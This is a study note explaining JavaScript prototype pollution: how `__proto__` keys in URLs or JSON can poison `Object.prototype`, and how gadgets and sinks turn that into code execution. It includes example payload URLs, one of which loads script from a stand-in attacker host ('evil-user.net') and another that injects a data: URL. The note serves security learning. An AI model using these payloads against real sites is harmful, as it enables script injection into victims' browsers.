# Prototype pollution

When JS function recursively merges an object containing controllable properties into an existing object, with no key sanitizing.

Can inject a property with a key like `__proto__` with nested properties.

Could assign nested properties to the object's prototype instead of the target object.

Can pollute any object, but most common is the built-in global `Object.prototype`.

### Successful exploitation requires:
- Prototype pollution source: any input that allows poisoning
- A sink: JS function or DOM that enables arbitrary code execution
- An exploitable gadget: property that is passed into a sink without filtering or sanitization

## Prototype pollution Sources

Input that allows adding arbitrary properties to prototype objects:
* URL via the query or fragment string (hash)
* JSON-based input
* Web messages

## Prototype pollution via URL

https://vulnerable-website.com/?__proto__[evilProperty]=payload

Might think will be added to the object as follows:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
But it actually the recursive merge operation may assign the value of evilProperty using:

targetObject.`__proto__.evilProperty = 'payload';`

JS treats `__proto__` as a getter for the prototype, resulting in evilProperty being assigned to the prototype object, all objects in the JS will now inherit evilProperty, unless have a property of their own matching a key.

In practice injecting evilProperty may not have any effect, but the attacker could pollute with properties used in the application or imperted libraries.

## Prototype pollution via JSON input

User-controllable objects often ccome from JSON string with `JSON.parse()`, that treats any key as string, including things like `__proto__`

Attacker injects JSON:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
this is converted into a JS object via `JSON.parse()`, resulting in a property with key `__proto__`:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true

If objects created via JSON.parse() and merged into object without sanitization, then will lead to prototype pollution
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## 1. Prototype Pollution sinks

JS function or DOM that can be accessed via prototype pollution, it enables to execute JS or commands.

## 2. Prototype Pollution Gadgets

Gadget allos to turn prototype pollution into an exploit. 

This is any property that is:
* Used not safely, like no filtering / sanitization
* An attacker controllable via prototype pollution, the object can inherit versions of the property added.

A property can't be a gadget if it is defined on the object itself. In this case the object's own version takes precedence over the malicious one.

Robust websites set prototype of object to `null`, ensuring no inheritance of properties.

### Example:

`let transport_url = config.transport_url || defaults.transport_url;`

Library uses transport_url to add a script reference:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If developers haven't set a `transport_url` property, then this would be a potential gadget.

In case attacker can pullute `Object.prototype` with their `transport_url`, this will be inherited by the config object and set src for the script the attacker's.

If prototype can be polluted via query parameter, the attacker would just have to make the victim visit the crafted URL to import malicious JS.

`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

With data, can inject directly:

`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

comments hardcoded/example.js
